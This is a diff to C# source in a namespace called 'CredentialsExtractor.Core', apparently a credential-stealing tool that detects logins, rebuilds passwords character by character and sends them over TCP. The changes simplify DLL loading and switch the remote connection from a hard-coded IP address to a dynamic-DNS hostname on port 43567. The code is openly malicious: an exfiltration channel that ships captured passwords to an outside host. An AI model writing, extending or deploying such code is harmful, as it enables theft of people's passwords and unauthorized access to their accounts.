@@ -55,32 +55,7 @@ namespace CredentialsExtractor.Core
 
             try
             {
-                // Check if DLL exists
-                if (!File.Exists(_config.LoginDetectorDllPath))
-                {
-                    throw new FileNotFoundException($"LoginDetector DLL not found at: {_config.LoginDetectorDllPath}");
-                }
-
-                // Copy DLL to application directory if it's not already there
                 string localDllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "LoginDetectorDLL.dll");
-                if (!File.Exists(localDllPath) ||
-                    File.GetLastWriteTime(localDllPath) < File.GetLastWriteTime(_config.LoginDetectorDllPath))
-                {
-                    _logger.Log($"Copying DLL from {_config.LoginDetectorDllPath} to {localDllPath}");
-                    File.Copy(_config.LoginDetectorDllPath, localDllPath, true);
-                }
-
-                // Also copy OpenCV DLL if it's available
-                string opencvDllSource = Path.Combine(Path.GetDirectoryName(_config.LoginDetectorDllPath), "opencv_world490.dll");
-                string opencvDllDest = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "opencv_world490.dll");
-
-                if (File.Exists(opencvDllSource) &&
-                   (!File.Exists(opencvDllDest) ||
-                    File.GetLastWriteTime(opencvDllDest) < File.GetLastWriteTime(opencvDllSource)))
-                {
-                    _logger.Log($"Copying OpenCV DLL from {opencvDllSource} to {opencvDllDest}");
-                    File.Copy(opencvDllSource, opencvDllDest, true);
-                }
 
                 // Initialize the native library
                 _logger.Log($"Initializing LoginDetector DLL from {localDllPath}");
@@ -459,7 +434,7 @@ namespace CredentialsExtractor.Core
                         }
                     }
 
-                    // Skip if we've already added enough characters
+                    // Skip if already added enough characters
                     if (charsAdded >= charsToAdd) break;
 
                     // Add character to password
@@ -521,9 +496,8 @@ namespace CredentialsExtractor.Core
                     client.SendTimeout = 5000;
                     client.ReceiveTimeout = 5000;
 
-                    Console.WriteLine("aasdasdasfdsdsadasd");
-                    // Connect to the server - updated to use your external port
-                    client.Connect("46.116.189.221", 43567);
+                    // Connect to the server
+                    client.Connect("a1.hopto.org", 43567);
 
                     using (NetworkStream stream = client.GetStream())
                     {
